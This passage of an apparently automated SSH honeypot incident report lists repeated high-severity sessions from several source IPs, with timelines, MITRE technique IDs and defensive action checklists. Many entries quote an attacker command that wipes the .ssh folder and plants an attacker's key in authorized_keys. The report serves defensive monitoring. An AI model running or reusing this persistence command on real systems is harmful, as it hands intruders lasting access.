| `2026-06-02 23:07:50` | `cowrie.command.failed` |
| `2026-06-02 23:07:50` | `cowrie.log.closed` |
| `2026-06-02 23:07:50` | `cowrie.session.params` |
| `2026-06-02 23:07:50` | `cowrie.command.input` |
| `2026-06-02 23:07:50` | `cowrie.session.file_download` |
| `2026-06-02 23:07:50` | `cowrie.log.closed` |
| `2026-06-02 23:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5a405a3362

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:07 |
| **Last Seen** | 2026-06-02 23:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:07:53` | `cowrie.session.connect` |
| `2026-06-02 23:07:53` | `cowrie.client.version` |
| `2026-06-02 23:07:53` | `cowrie.client.kex` |
| `2026-06-02 23:07:54` | `cowrie.login.success` |
| `2026-06-02 23:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adccb321f332

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:08 |
| **Last Seen** | 2026-06-02 23:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:08:02` | `cowrie.session.connect` |
| `2026-06-02 23:08:02` | `cowrie.client.version` |
| `2026-06-02 23:08:02` | `cowrie.client.kex` |
| `2026-06-02 23:08:02` | `cowrie.login.success` |
| `2026-06-02 23:08:03` | `cowrie.session.params` |
| `2026-06-02 23:08:03` | `cowrie.command.input` |
| `2026-06-02 23:08:03` | `cowrie.command.failed` |
| `2026-06-02 23:08:03` | `cowrie.log.closed` |
| `2026-06-02 23:08:03` | `cowrie.session.params` |
| `2026-06-02 23:08:03` | `cowrie.command.input` |
| `2026-06-02 23:08:03` | `cowrie.session.file_download` |
| `2026-06-02 23:08:03` | `cowrie.log.closed` |
| `2026-06-02 23:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7260f68915cf

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:08 |
| **Last Seen** | 2026-06-02 23:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:08:04` | `cowrie.session.connect` |
| `2026-06-02 23:08:04` | `cowrie.client.version` |
| `2026-06-02 23:08:04` | `cowrie.client.kex` |
| `2026-06-02 23:08:04` | `cowrie.login.success` |
| `2026-06-02 23:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7e393f8513

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:08 |
| **Last Seen** | 2026-06-02 23:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:08:13` | `cowrie.session.connect` |
| `2026-06-02 23:08:13` | `cowrie.client.version` |
| `2026-06-02 23:08:13` | `cowrie.client.kex` |
| `2026-06-02 23:08:13` | `cowrie.login.success` |
| `2026-06-02 23:08:14` | `cowrie.session.params` |
| `2026-06-02 23:08:14` | `cowrie.command.input` |
| `2026-06-02 23:08:14` | `cowrie.command.failed` |
| `2026-06-02 23:08:14` | `cowrie.log.closed` |
| `2026-06-02 23:08:14` | `cowrie.session.params` |
| `2026-06-02 23:08:14` | `cowrie.command.input` |
| `2026-06-02 23:08:14` | `cowrie.session.file_download` |
| `2026-06-02 23:08:14` | `cowrie.log.closed` |
| `2026-06-02 23:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ac38a90657

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]74` |
| **First Seen** | 2026-06-02 23:08 |
| **Last Seen** | 2026-06-02 23:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:08:15` | `cowrie.session.connect` |
| `2026-06-02 23:08:15` | `cowrie.client.version` |
| `2026-06-02 23:08:15` | `cowrie.client.kex` |
| `2026-06-02 23:08:15` | `cowrie.login.success` |
| `2026-06-02 23:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f05be9c5354

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 23:09 |
| **Last Seen** | 2026-06-02 23:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:09:36` | `cowrie.session.connect` |
| `2026-06-02 23:09:36` | `cowrie.client.version` |
| `2026-06-02 23:09:36` | `cowrie.client.kex` |
| `2026-06-02 23:09:36` | `cowrie.login.success` |
| `2026-06-02 23:09:37` | `cowrie.session.params` |
| `2026-06-02 23:09:37` | `cowrie.command.input` |
| `2026-06-02 23:09:37` | `cowrie.command.failed` |
| `2026-06-02 23:09:37` | `cowrie.log.closed` |
| `2026-06-02 23:09:37` | `cowrie.session.params` |
| `2026-06-02 23:09:37` | `cowrie.command.input` |
| `2026-06-02 23:09:37` | `cowrie.session.file_download` |
| `2026-06-02 23:09:37` | `cowrie.log.closed` |
| `2026-06-02 23:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35ca4b9283d4

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 23:09 |
| **Last Seen** | 2026-06-02 23:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:09:40` | `cowrie.session.connect` |
| `2026-06-02 23:09:40` | `cowrie.client.version` |
| `2026-06-02 23:09:40` | `cowrie.client.kex` |
| `2026-06-02 23:09:40` | `cowrie.login.success` |
| `2026-06-02 23:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e770cb02bffb

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:12 |
| **Last Seen** | 2026-06-02 23:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:12:39` | `cowrie.session.connect` |
| `2026-06-02 23:12:39` | `cowrie.client.version` |
| `2026-06-02 23:12:39` | `cowrie.client.kex` |
| `2026-06-02 23:12:39` | `cowrie.login.success` |
| `2026-06-02 23:12:39` | `cowrie.session.params` |
| `2026-06-02 23:12:39` | `cowrie.command.input` |
| `2026-06-02 23:12:39` | `cowrie.command.failed` |
| `2026-06-02 23:12:39` | `cowrie.log.closed` |
| `2026-06-02 23:12:39` | `cowrie.session.params` |
| `2026-06-02 23:12:39` | `cowrie.command.input` |
| `2026-06-02 23:12:39` | `cowrie.session.file_download` |
| `2026-06-02 23:12:39` | `cowrie.log.closed` |
| `2026-06-02 23:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6092a7f2c4bd

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:12 |
| **Last Seen** | 2026-06-02 23:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:12:40` | `cowrie.session.connect` |
| `2026-06-02 23:12:40` | `cowrie.client.version` |
| `2026-06-02 23:12:40` | `cowrie.client.kex` |
| `2026-06-02 23:12:41` | `cowrie.login.success` |
| `2026-06-02 23:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9b33a8005d

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:14 |
| **Last Seen** | 2026-06-02 23:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:14:09` | `cowrie.session.connect` |
| `2026-06-02 23:14:09` | `cowrie.client.version` |
| `2026-06-02 23:14:09` | `cowrie.client.kex` |
| `2026-06-02 23:14:10` | `cowrie.login.success` |
| `2026-06-02 23:14:10` | `cowrie.session.params` |
| `2026-06-02 23:14:10` | `cowrie.command.input` |
| `2026-06-02 23:14:10` | `cowrie.command.failed` |
| `2026-06-02 23:14:10` | `cowrie.log.closed` |
| `2026-06-02 23:14:10` | `cowrie.session.params` |
| `2026-06-02 23:14:10` | `cowrie.command.input` |
| `2026-06-02 23:14:11` | `cowrie.session.file_download` |
| `2026-06-02 23:14:11` | `cowrie.log.closed` |
| `2026-06-02 23:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3081dbdc9dc3

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-02 23:14 |
| **Last Seen** | 2026-06-02 23:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:14:13` | `cowrie.session.connect` |
| `2026-06-02 23:14:13` | `cowrie.client.version` |
| `2026-06-02 23:14:13` | `cowrie.client.kex` |
| `2026-06-02 23:14:14` | `cowrie.login.success` |
| `2026-06-02 23:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0336f1948f5

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:14 |
| **Last Seen** | 2026-06-02 23:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:14:58` | `cowrie.session.connect` |
| `2026-06-02 23:14:58` | `cowrie.client.version` |
| `2026-06-02 23:14:58` | `cowrie.client.kex` |
| `2026-06-02 23:14:58` | `cowrie.login.success` |
| `2026-06-02 23:14:58` | `cowrie.session.params` |
| `2026-06-02 23:14:58` | `cowrie.command.input` |
| `2026-06-02 23:14:58` | `cowrie.command.failed` |
| `2026-06-02 23:14:58` | `cowrie.log.closed` |
| `2026-06-02 23:14:59` | `cowrie.session.params` |
| `2026-06-02 23:14:59` | `cowrie.command.input` |
| `2026-06-02 23:14:59` | `cowrie.session.file_download` |
| `2026-06-02 23:14:59` | `cowrie.log.closed` |
| `2026-06-02 23:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8428ca895a55

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:15 |
| **Last Seen** | 2026-06-02 23:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:15:00` | `cowrie.session.connect` |
| `2026-06-02 23:15:00` | `cowrie.client.version` |
| `2026-06-02 23:15:00` | `cowrie.client.kex` |
| `2026-06-02 23:15:00` | `cowrie.login.success` |
| `2026-06-02 23:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd701b7d663

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:16 |
| **Last Seen** | 2026-06-02 23:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:16:52` | `cowrie.session.connect` |
| `2026-06-02 23:16:52` | `cowrie.client.version` |
| `2026-06-02 23:16:52` | `cowrie.client.kex` |
| `2026-06-02 23:16:52` | `cowrie.login.success` |
| `2026-06-02 23:16:52` | `cowrie.session.params` |
| `2026-06-02 23:16:52` | `cowrie.command.input` |
| `2026-06-02 23:16:52` | `cowrie.command.failed` |
| `2026-06-02 23:16:53` | `cowrie.log.closed` |
| `2026-06-02 23:16:53` | `cowrie.session.params` |
| `2026-06-02 23:16:53` | `cowrie.command.input` |
| `2026-06-02 23:16:53` | `cowrie.session.file_download` |
| `2026-06-02 23:16:53` | `cowrie.log.closed` |
| `2026-06-02 23:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c969c27449

| Field | Detail |
|---|---|
| **Source IP** | `103.171.69[.]82` |
| **First Seen** | 2026-06-02 23:16 |
| **Last Seen** | 2026-06-02 23:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:16:54` | `cowrie.session.connect` |
| `2026-06-02 23:16:54` | `cowrie.client.version` |
| `2026-06-02 23:16:54` | `cowrie.client.kex` |
| `2026-06-02 23:16:54` | `cowrie.login.success` |
| `2026-06-02 23:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.69[.]82` to AbuseIPDB if not already reported
- [ ] Block `103.171.69[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b32ac6b846e

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:17 |
| **Last Seen** | 2026-06-02 23:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:17:13` | `cowrie.session.connect` |
| `2026-06-02 23:17:13` | `cowrie.client.version` |
| `2026-06-02 23:17:13` | `cowrie.client.kex` |
| `2026-06-02 23:17:13` | `cowrie.login.success` |
| `2026-06-02 23:17:13` | `cowrie.session.params` |
| `2026-06-02 23:17:13` | `cowrie.command.input` |
| `2026-06-02 23:17:13` | `cowrie.command.failed` |
| `2026-06-02 23:17:13` | `cowrie.log.closed` |
| `2026-06-02 23:17:14` | `cowrie.session.params` |
| `2026-06-02 23:17:14` | `cowrie.command.input` |
| `2026-06-02 23:17:14` | `cowrie.session.file_download` |
| `2026-06-02 23:17:14` | `cowrie.log.closed` |
| `2026-06-02 23:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1faa47ed63

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 23:17 |
| **Last Seen** | 2026-06-02 23:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 23:17:15` | `cowrie.session.connect` |
| `2026-06-02 23:17:15` | `cowrie.client.version` |
| `2026-06-02 23:17:15` | `cowrie.client.kex` |
| `2026-06-02 23:17:15` | `cowrie.login.success` |
| `2026-06-02 23:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d139f0c7190

| Field | Detail |
